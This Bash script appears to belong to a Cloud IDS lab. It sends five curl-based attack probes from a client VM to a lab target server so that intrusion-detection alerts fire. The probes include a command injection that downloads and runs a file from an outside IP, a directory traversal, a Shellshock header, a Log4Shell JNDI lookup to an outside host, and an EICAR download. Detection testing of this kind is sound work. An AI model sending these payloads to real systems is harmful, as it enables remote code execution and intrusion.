#!/usr/bin/env bash
# ==============================================================================
# Step 4: Cloud IDS Attack Simulation Runner
# Executes 5 safe curl-based exploit & malware test cases from the Client VM
# (ids-attacker-client) against the Target Server VM (ids-target-server).
# ==============================================================================
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
CONFIG_FILE="${ROOT_DIR}/config.yaml"

CLI_PROJECT_ID=""
DRY_RUN=false

while [[ $# -gt 0 ]]; do
    case "$1" in
        --project)
            CLI_PROJECT_ID="$2"
            shift 2
            ;;
        --dry-run)
            DRY_RUN=true
            shift
            ;;
        *)
            shift
            ;;
    esac
done

# Helper to read values safely from config.yaml via yaml.safe_load()
cfg_get() {
    local key_path="$1"
    local default_val="$2"
    if [ -f "${CONFIG_FILE}" ]; then
        python3 -c '
import sys, yaml
with open(sys.argv[1], "r", encoding="utf-8") as f:
    data = yaml.safe_load(f) or {}
val = data
for k in sys.argv[2].split("."):
    if isinstance(val, dict):
        val = val.get(k)
    else:
        val = None
        break
print(val if val not in (None, "") else sys.argv[3])
' "${CONFIG_FILE}" "${key_path}" "${default_val}" 2>/dev/null || echo "${default_val}"
    else
        echo "${default_val}"
    fi
}

PROJECT_ID="${CLI_PROJECT_ID:-${PROJECT_ID:-$(cfg_get "project_id" "YOUR_PROJECT_ID")}}"
ZONE="$(cfg_get "zone" "us-central1-a")"
CLIENT_VM="$(cfg_get "target_vms.client_vm.name" "ids-attacker-client")"
SERVER_VM="$(cfg_get "target_vms.server_vm.name" "ids-target-server")"
TARGET_IP="$(cfg_get "attack_simulation.target_ip" "192.168.10.10")"

# Input validation against strict allow-lists (mandatory-secure-web-skills)
validate_gcp_id() {
    local val="$1"
    local label="$2"
    if [[ ! "$val" =~ ^[a-z][a-z0-9-]{4,61}[a-z0-9]$ ]]; then
        echo -e "${RED}Error: Invalid ${label} '${val}'. Please set a valid project_id in config.yaml or pass --project <PROJECT_ID>.${NC}"
        exit 1
    fi
}

validate_ipv4() {
    local ip="$1"
    if [[ ! "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        echo -e "${RED}Error: Invalid IPv4 address '${ip}'.${NC}"
        exit 1
    fi
}

if [[ "$PROJECT_ID" == "YOUR_PROJECT_ID" || -z "$PROJECT_ID" ]]; then
    if [[ "$DRY_RUN" == "false" ]]; then
        echo -e "${RED}Error: project_id is still set to placeholder 'YOUR_PROJECT_ID'.${NC}"
        echo -e "Update ${CYAN}project_id${NC} in ${GREEN}config.yaml${NC} or pass ${GREEN}--project <PROJECT_ID>${NC}."
        exit 1
    fi
else
    validate_gcp_id "$PROJECT_ID" "PROJECT_ID"
fi

validate_gcp_id "$ZONE" "ZONE"
validate_gcp_id "$CLIENT_VM" "CLIENT_VM"
validate_ipv4 "$TARGET_IP"

echo -e "${BLUE}====================================================================${NC}"
echo -e "${BLUE}${BOLD}   Step 4: Cloud IDS Safe Attack Traffic Simulation                 ${NC}"
echo -e "${BLUE}====================================================================${NC}"
echo -e "  ${CYAN}Project ID:${NC}        ${PROJECT_ID}"
echo -e "  ${CYAN}Zone:${NC}              ${ZONE}"
echo -e "  ${CYAN}Attacker VM:${NC}       ${CLIENT_VM}"
echo -e "  ${CYAN}Target Server VM:${NC}  ${SERVER_VM} (${TARGET_IP})"
echo ""

REMOTE_SCRIPT=$(cat <<EOF
set -euo pipefail
echo ">>> Verify connectivity from ${CLIENT_VM} to ${SERVER_VM} (${TARGET_IP})..."
curl -s -I --connect-timeout 5 "http://${TARGET_IP}/" | head -n 1

echo ""
echo ">>> [TC-01 | Expected Severity: LOW] OS Command Injection / WebLogin CGI Probe"
curl -s -o /dev/null "http://${TARGET_IP}/weblogin.cgi?username=admin';cd%20/tmp;wget%20http://123.123.123.123/evil;sh%20evil;rm%20evil" || true
sleep 2

echo ">>> [TC-02 | Expected Severity: MEDIUM] Directory Traversal (WINNT/win.ini)"
curl -s -o /dev/null "http://${TARGET_IP}/?item=../../../../WINNT/win.ini" || true
sleep 2

echo ">>> [TC-03 | Expected Severity: HIGH] GNU Bash RCE (Shellshock CVE-2014-6271)"
curl -s -o /dev/null -H 'User-Agent: () { :; }; 123.123.123.123:9999' "http://${TARGET_IP}/cgi-bin/test-critical" || true
sleep 2

echo ">>> [TC-04 | Expected Severity: CRITICAL] Apache Log4j JNDI Lookup Probe (Log4Shell CVE-2021-44228)"
curl -s -o /dev/null -H 'X-Api-Version: \${jndi:ldap://123.123.123.123:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}' "http://${TARGET_IP}/" || true
sleep 2

echo ">>> [TC-05 | Expected Severity: HIGH/CRITICAL] EICAR Standard Anti-Malware Test File Download"
curl -s -o /dev/null "http://${TARGET_IP}/eicar.file" || true

echo ""
echo ">>> All 5 simulated attack test cases transmitted over mirrored subnet."
EOF
)

if [[ "$DRY_RUN" == "true" ]]; then
    echo -e "${YELLOW}[DRY-RUN] Would execute via IAP SSH on ${CLIENT_VM}:${NC}"
    echo "gcloud compute ssh \"${CLIENT_VM}\" --project=\"${PROJECT_ID}\" --zone=\"${ZONE}\" --tunnel-through-iap --command=..."
    echo ""
    echo "${REMOTE_SCRIPT}"
    exit 0
fi

gcloud compute ssh "${CLIENT_VM}" \
    --project="${PROJECT_ID}" \
    --zone="${ZONE}" \
    --tunnel-through-iap \
    --command="${REMOTE_SCRIPT}"

echo -e "\n${GREEN}✓ Attack simulation complete! Allow 60–90 seconds for Cloud IDS threat logs to ingest, then run:${NC}"
echo -e "  ${BOLD}./scripts/verify_alerts.sh --project ${PROJECT_ID}${NC}"
